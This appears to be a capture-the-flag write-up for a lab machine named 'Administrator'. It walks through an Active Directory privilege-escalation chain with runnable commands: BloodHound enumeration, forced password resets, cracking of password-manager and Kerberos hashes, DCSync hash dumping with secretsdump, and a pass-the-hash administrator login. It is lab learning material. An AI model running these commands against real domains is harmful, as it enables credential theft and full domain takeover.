#box #GenericAll #ForceChangePassword #password-safe3 #psafe3 #nxc #Kerberoasting #GenericWrite #GetChangesAll #impacket-secretsdump #
1. The machine shows an AD environment where we have an Assumed Breach scenario.
2. Our user, `Olivia:ichliebedich` has access to the AD environment and we can download the AD composition with `bloodhound`
```sh
bloodhound-python -u 'Olivia' -p 'ichliebedich' -ns 10.129.13.159 -d administrator.htb -c all
```
3. Once downloaded, we discover that Olivia has `GenericAll` over the user `Michael`, thus we can `ForceChangePassword` with `net rpc` to gain control of that user
```sh
net rpc password "michael" "ichliebedich" -U "ADMINISTRATOR"/"Olivia"%"ichliebedich" -S "dc.administrator.htb"
```
![[attachments/administrator-1.png]]
4. After gaining control of the user `Michael`, we discover that this user has `ForceChangePassword` over the user `Benjamin`. Same thing happened above that repeats
```sh
net rpc password "benjamin" "ichliebedich" -U "ADMINISTRATOR"/"michael"%"ichliebedich" -S "dc.administrator.htb"
```

![[attachments/administrator-2.png]]
5. Finally, we gain control of the user `Benjamin` that belongs to an interesting group called `Share Moderators`. After trying to check whether there was any interesting SMB Access but there isn't we discover that the system also has a FTP service running. We check with `nxc` whether we can access it or not with `Benjamin` discovering that this user can effectively access FTP
```sh
nxc ftp 10.129.13.159 -u 'benjamin' -p 'ichliebedich' administrator.htb
```
![[attachments/administrator-3.png]]
6. Inside the FTP, we discover a file named `Backup.psafe3`. A quick online search tells us that this `.psafe3` belongs to a password manager called `passwordsafe` (or `psafe`). We download the package on kali and finally open the file with `pwsafe Backup.psafe3`. However, the `psafe3` by default has a master password. The master password can be cracked with `hashcat` with version `5200`, discovering the master password to be `tekieromucho`
```sh
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```
7. Once done, we open the `psafe3` file and discover a few users listed inside the password manager:
![[attachments/administrator-4.png]]
8. We discover that the password column is hidden, so we right click on the column headers and enable it:
![[attachments/administrator-5.png]]
9. After discover the 3 passwords, we try to crack them without success (they seems not to belong to any particular hash), we try to decoded them from base64, without success. Finally, we use those 3 passwords against those 3 users, discovering that one of those 3 passwords is effectively a password, discovering the user `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
![[attachments/administrator-6.png]]
![[attachments/administrator-7.png]]
10. By looking at bloodhound, this user has `GenericWrite` over the user `Ethan`, thus we gain control of it through a `targetedKerberoast` after cracking its TGS
```sh
# if the kerberoast fails
sudo ntpdate administrator.htb

targetedKerberoast -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
![[attachments/administrator-9.png]]
![[attachments/administrator-8.png]]
11. We crack its TGS obtaining the password `limpbizkit`
```sh
hashcat -m 13100 hash_ethan.txt /usr/share/wordlists/rockyou.txt
```
12. Finally, since `Ethan` has `GetChangesAll` over `Domain`, we can use `impacket-secretsdump` to gain the NTLM hashes of all the domain
![[attachments/administrator-10.png]]
```sh
impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'
```
13. We can finally authenticate, as the domain administrator with `evil-winrm`
```sh
evil-winrm -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e' -i 10.129.13.159
```